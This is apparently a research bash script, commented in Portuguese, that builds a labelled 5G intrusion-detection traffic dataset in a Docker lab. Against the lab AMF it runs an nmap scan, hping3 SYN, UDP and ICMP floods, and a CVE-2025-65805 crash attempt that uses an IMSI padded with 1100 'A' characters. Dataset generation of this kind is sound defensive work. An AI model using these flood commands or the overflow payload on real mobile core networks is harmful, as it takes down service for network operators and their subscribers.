#!/usr/bin/env bash
# =============================================================================
# 05_generate_traffic.sh
# Gera tráfego para o dataset: benigno contínuo + ataques convencionais + CVE
# Duração total: ~300s (5 min)
#
# Uso:
#   ./scripts/05_generate_traffic.sh
#   CVE_METHOD=ueransim ./scripts/05_generate_traffic.sh
#   CVE_METHOD=python   ./scripts/05_generate_traffic.sh
#   CVE_METHOD=none     ./scripts/05_generate_traffic.sh
# =============================================================================
set -euo pipefail

ROOT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
cd "$ROOT_DIR"

# --- Configuração ---------------------------------------------------------
RESULTS_DIR="results/mixed"
PCAP_RAW="$RESULTS_DIR/cve5g_mixed_raw.pcap"
PCAP_FILTERED="$RESULTS_DIR/cve5g_mixed_filtered.pcap"
LABELS_CSV="$RESULTS_DIR/cve5g_labels.csv"
TSHARK_PID_FILE="$RESULTS_DIR/tshark_mixed.pid"
AMF_LOG="$RESULTS_DIR/amf_crash.log"

# IPs da topologia (conforme docker-compose.yml)
DN_IP="192.168.70.135"        # oai-ext-dn
AMF_IP="192.168.70.132"       # oai-amf
KALI_IP="192.168.70.140"      # oai-attacker

# IP que o UE recebe na sessão PDU - detectado automaticamente
UE_BIND_IP="${UE_BIND_IP:-}"

AMF_SBI_PORT=80
AMF_NGAP_PORT=38412

SUDO_PASSWORD="${SUDO_PASSWORD:-}"
TOTAL_DURATION=300

CVE_METHOD="${CVE_METHOD:-ueransim}"
EXPLOIT_SRC="scripts/exploits/cve_65805_exploit.py"

T0=$(date +%s)

mkdir -p "$RESULTS_DIR"

# --- Helpers --------------------------------------------------------------
sudo_run() {
  if [[ -n "$SUDO_PASSWORD" ]]; then
    printf '%s\n' "$SUDO_PASSWORD" | sudo -S -p '' "$@"
  else
    sudo "$@"
  fi
}

container_running() {
  [[ "$(docker inspect -f '{{.State.Status}}' "$1" 2>/dev/null)" == "running" ]]
}

elapsed() { echo $(( $(date +%s) - T0 )); }
log()     { echo "[$(elapsed)s] $*"; }

label() {
  local name="$1" src="$2" dst="$3" t_start="$4" t_end="$5"
  echo "$name,$src,$dst,$t_start,$t_end" >> "$LABELS_CSV"
}

# Detecta o IP do UE na interface de dados (oaitun_ue1 ou uesimtun0)
detect_ue_ip() {
  local ip
  # Tenta a interface de túnel GTP do OAI UE
  ip=$(docker exec oai-nr-ue1 \
    bash -c "ip -4 addr show oaitun_ue1 2>/dev/null | grep -oP '(?<=inet )[\d.]+'" \
  ) || true

  # Fallback: qualquer interface que não seja lo ou eth
  if [[ -z "$ip" ]]; then
    ip=$(docker exec oai-nr-ue1 \
      bash -c "ip -4 addr show | grep -v '127\.' | grep -v '192\.168\.' | grep -oP '(?<=inet )[\d.]+' | head -1" \
    ) || true
  fi

  echo "$ip"
}

amf_alive() {
  container_running oai-amf && \
    docker exec oai-amf bash -c "kill -0 1 2>/dev/null" 2>/dev/null
}

capture_amf_crash_log() {
  echo "[$(elapsed)s] Capturando logs do AMF (evidência de crash)..."
  docker logs oai-amf --tail 50 > "$AMF_LOG" 2>&1 || true
  echo "[$(elapsed)s] Log do AMF salvo em: $AMF_LOG"
}

wait_kali_ready() {
  echo "Aguardando ferramentas do Kali ficarem prontas (pode levar 2-3 min)..."
  local max_wait=180 waited=0
  while ! docker exec oai-attacker test -f /tmp/ready 2>/dev/null; do
    if [[ $waited -ge $max_wait ]]; then
      echo "[erro] Kali não ficou pronto após ${max_wait}s."
      echo "       Verifique com: docker logs oai-attacker"
      exit 1
    fi
    sleep 5
    waited=$(( waited + 5 ))
    echo "  ... aguardando Kali ($waited/${max_wait}s)"
  done
  echo "Kali pronto."
}

# --- Cleanup --------------------------------------------------------------
cleanup() {
  echo "[cleanup] Encerrando processos..."
  if [[ -f "$TSHARK_PID_FILE" ]]; then
    local pid; pid="$(cat "$TSHARK_PID_FILE")"
    if kill -0 "$pid" 2>/dev/null; then
      sudo_run kill "$pid" || true
    fi
    rm -f "$TSHARK_PID_FILE"
  fi
  docker exec oai-nr-ue1 pkill iperf3 2>/dev/null || true
  docker exec oai-ext-dn pkill iperf3 2>/dev/null || true
}
trap cleanup EXIT

# ==========================================================================
# PRÉ-CHECKS  (antes de definir T0 do experimento)
# ==========================================================================

# 1. Containers obrigatórios
for c in oai-ext-dn oai-nr-ue1 oai-attacker oai-amf; do
  if ! container_running "$c"; then
    echo "[erro] Container $c não está ativo. Execute scripts/01_bootstrap.sh"
    exit 1
  fi
done

# 2. tshark no host
if ! command -v tshark >/dev/null 2>&1; then
  echo "[erro] tshark não encontrado no host."; exit 1
fi

# 3. Arquivo do exploit (antes do docker cp)
if [[ "$CVE_METHOD" == "python" ]]; then
  if [[ ! -f "$EXPLOIT_SRC" ]]; then
    echo "[erro] Exploit não encontrado: $EXPLOIT_SRC"
    echo "       Crie o arquivo antes de usar CVE_METHOD=python"
    exit 1
  fi
fi

# 4. Aguarda instalação do Kali terminar
wait_kali_ready

# 5. Copia exploit (só se necessário)
if [[ "$CVE_METHOD" == "python" ]]; then
  echo "Copiando exploit para o container Kali..."
  docker cp "$EXPLOIT_SRC" oai-attacker:/tmp/cve_65805_exploit.py
fi

# 6. Detecta IP do UE se não fornecido
if [[ -z "$UE_BIND_IP" ]]; then
  echo "Detectando IP do UE..."
  UE_BIND_IP=$(detect_ue_ip)
  if [[ -z "$UE_BIND_IP" ]]; then
    echo "[erro] Não foi possível detectar o IP do UE."
    echo "       Forneça manualmente: UE_BIND_IP=12.1.1.2 ./scripts/05_generate_traffic.sh"
    exit 1
  fi
  echo "IP do UE detectado: $UE_BIND_IP"
fi

# ==========================================================================
# INÍCIO DO EXPERIMENTO — T0 real começa aqui
# ==========================================================================
echo ""
echo "=== CVE5G — Geração de Dataset Misto (${TOTAL_DURATION}s) ==="
echo "    Método CVE:  $CVE_METHOD"
echo "    UE IP:       $UE_BIND_IP"
echo "    AMF IP:      $AMF_IP"
echo "    Kali IP:     $KALI_IP"
echo ""

echo "label,src_ip,dst_ip,t_start,t_end" > "$LABELS_CSV"
T0=$(date +%s)  

# [T=0] Captura global
log "Iniciando captura na interface oaiworkshop..."
sudo_run tshark -i oaiworkshop -w "$PCAP_RAW" >/tmp/tshark_mixed.log 2>&1 &
echo $! > "$TSHARK_PID_FILE"
sleep 2

# [T=2] Servidor de dados
log "Iniciando servidor iperf3 no DN..."
docker exec -d oai-ext-dn iperf3 -s
sleep 2

# [T=4] Verificação de conectividade UE→DN
log "Verificando conectividade UE→DN (iperf3 5s)..."
if ! docker exec oai-nr-ue1 \
     iperf3 -B "$UE_BIND_IP" -c "$DN_IP" -t 5 --connect-timeout 3000 \
     >/dev/null 2>&1; then
  echo "[erro] UE não consegue alcançar o DN."
  echo "       Verifique: docker exec oai-nr-ue1 ip route"
  exit 1
fi

# [T=9] Streams de tráfego benigno (correm pelo experimento todo)
log "Iniciando streams benigno (vídeo TCP + áudio UDP)..."
TS_BENIGN=$(elapsed)
docker exec -d oai-nr-ue1 iperf3 -B "$UE_BIND_IP" -c "$DN_IP" -R -t "$TOTAL_DURATION" -b 15M
docker exec -d oai-nr-ue1 iperf3 -B "$UE_BIND_IP" -c "$DN_IP" -u  -b 2M  -t "$TOTAL_DURATION"
label "benign_video_tcp" "$UE_BIND_IP" "$DN_IP" "$TS_BENIGN" "$TOTAL_DURATION"
label "benign_audio_udp"  "$UE_BIND_IP" "$DN_IP" "$TS_BENIGN" "$TOTAL_DURATION"

log "Aguardando 30s de tráfego benigno antes dos ataques..."
sleep 30

# ==========================================================================
# ATAQUE 1: Port Scan (nmap SYN)                               ~T=40s
# ==========================================================================
log "Ataque 1: Port Scan → $AMF_IP"
TS=$(elapsed)
docker exec oai-attacker \
  nmap -sS -p 80,8080,38412,2152 -T4 "$AMF_IP" \
  >/tmp/nmap_result.txt 2>&1 || true
TE=$(elapsed)
label "attack_portscan" "$KALI_IP" "$AMF_IP" "$TS" "$TE"
log "Ataque 1 finalizado (${TS}s→${TE}s)."
sleep 10

# ==========================================================================
# ATAQUE 2: TCP SYN Flood (30s)                                ~T=80s
# ==========================================================================
log "Ataque 2: TCP SYN Flood → $AMF_IP:$AMF_SBI_PORT"
TS=$(elapsed)
docker exec oai-attacker \
  timeout 30 hping3 -S --flood -p "$AMF_SBI_PORT" "$AMF_IP" \
  >/dev/null 2>&1 || true
TE=$(elapsed)
label "attack_syn_flood" "$KALI_IP" "$AMF_IP" "$TS" "$TE"
log "Ataque 2 finalizado (${TS}s→${TE}s)."
sleep 10

# ==========================================================================
# ATAQUE 3: UDP Flood (30s)                                    ~T=120s
# ==========================================================================
log "Ataque 3: UDP Flood → $AMF_IP:$AMF_SBI_PORT"
TS=$(elapsed)
docker exec oai-attacker \
  timeout 30 hping3 --udp --flood -p "$AMF_SBI_PORT" "$AMF_IP" \
  >/dev/null 2>&1 || true
TE=$(elapsed)
label "attack_udp_flood" "$KALI_IP" "$AMF_IP" "$TS" "$TE"
log "Ataque 3 finalizado (${TS}s→${TE}s)."
sleep 10

# ==========================================================================
# ATAQUE 4: ICMP Flood (30s)                                   ~T=160s
# ==========================================================================
log "Ataque 4: ICMP Flood → $AMF_IP"
TS=$(elapsed)
docker exec oai-attacker \
  timeout 30 hping3 -1 --flood "$AMF_IP" \
  >/dev/null 2>&1 || true
TE=$(elapsed)
label "attack_icmp_flood" "$KALI_IP" "$AMF_IP" "$TS" "$TE"
log "Ataque 4 finalizado (${TS}s→${TE}s)."
sleep 10

# ==========================================================================
# ATAQUE 5: CVE-2025-65805 — Buffer Overflow NAS parser        ~T=210s
# ==========================================================================
if [[ "$CVE_METHOD" != "none" ]]; then
  log "Ataque 5: CVE-2025-65805 (método: $CVE_METHOD) → $AMF_IP"
  docker logs oai-amf --tail 20 > "${AMF_LOG}.before" 2>&1 || true
  TS=$(elapsed)

  if [[ "$CVE_METHOD" == "ueransim" ]]; then
    log "Injetando payload malicioso via rádio (acordando UE2)..."
    
    # Monta o IMSI base + 1100 letras "A" para o Buffer Overflow
    OVERSIZED_IMSI="001010000000102$(python3 -c 'print("A"*1100)')"
    
    # Roda o modem do UE2 passando o IMSI
    docker exec oai-nr-ue2 timeout 15 /opt/oai-nr-ue/bin/nr-uesoftmodem -O /opt/oai-nr-ue/etc/nr-ue.yaml -E --rfsim -r 106 --numerology 1 --uicc0.imsi ${OVERSIZED_IMSI} -C 3319680000 --rfsimulator.serveraddr 192.168.70.160 --log_config.global_log_options level,nocolor,time >/tmp/ue2_cve_output.txt 2>&1 || true

  elif [[ "$CVE_METHOD" == "python" ]]; then
    docker exec oai-attacker \
      python3 /tmp/cve_65805_exploit.py \
        --target "$AMF_IP" \
        --port "$AMF_NGAP_PORT" \
        --imsi-len 1500 \
      2>&1 | tee /tmp/cve_exploit_output.txt || true
  fi

  TE=$(elapsed)
  label "attack_cve_65805" "$KALI_IP" "$AMF_IP" "$TS" "$TE"
  log "Ataque 5 finalizado (${TS}s→${TE}s)."

  sleep 3
  if ! amf_alive; then
    log "*** AMF CRASHED — DoS confirmado (CVE-2025-65805 reproduzida) ***"
    capture_amf_crash_log
    label "benign_interrupted_by_cve" "$AMF_IP" "$UE_BIND_IP" "$TE" "$TE"
  else
    log "[aviso] AMF ainda ativo após exploit."
    log "        Versão instalada: $(docker exec oai-amf cat /VERSION 2>/dev/null || echo 'desconhecida')"
  fi
else
  log "CVE pulada (CVE_METHOD=none)."
fi

# Aguarda completar os 5 minutos
REMAINING=$(( TOTAL_DURATION - $(elapsed) ))
if [[ "$REMAINING" -gt 0 ]]; then
  log "Aguardando mais ${REMAINING}s para completar os 5 minutos..."
  sleep "$REMAINING"
fi

# ==========================================================================
# FINALIZAÇÃO
# ==========================================================================
log "Encerrando captura..."
cleanup
trap - EXIT

sudo_run chown "$USER":"$(id -gn)" "$PCAP_RAW" || true

log "Gerando PCAP filtrado (http2, ngap, pfcp, gtp)..."
tshark -r "$PCAP_RAW" \
  -Y "http2 or ngap or pfcp or gtp" \
  -w "$PCAP_FILTERED"

sudo_run chown "$USER":"$(id -gn)" "$PCAP_FILTERED" || true

echo ""
echo "=== Concluído ==="
echo "PCAP bruto:      $PCAP_RAW"
echo "PCAP filtrado:   $PCAP_FILTERED"
echo "Rótulos CSV:     $LABELS_CSV"
echo "Log de crash:    $AMF_LOG"
echo ""
cat "$LABELS_CSV"